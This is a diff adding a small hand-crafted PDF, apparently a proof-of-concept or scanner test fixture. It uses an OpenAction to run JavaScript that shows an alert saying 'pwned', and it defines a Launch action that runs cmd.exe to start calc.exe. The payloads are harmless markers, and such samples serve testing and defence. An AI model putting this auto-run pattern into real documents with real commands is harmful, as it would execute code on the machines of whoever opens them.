@@ -1,0 +1,23 @@
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [4 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Action /S /JavaScript /JS (app.alert("pwned")) >>
+endobj
+4 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
+endobj
+5 0 obj
+<< /Type /Action /S /Launch /Win << /F (cmd.exe) /P (/c calc.exe) >> >>
+endobj
+xref
+0 6
+trailer
+<< /Size 6 /Root 1 0 R >>
+startxref
+0
+%%EOF
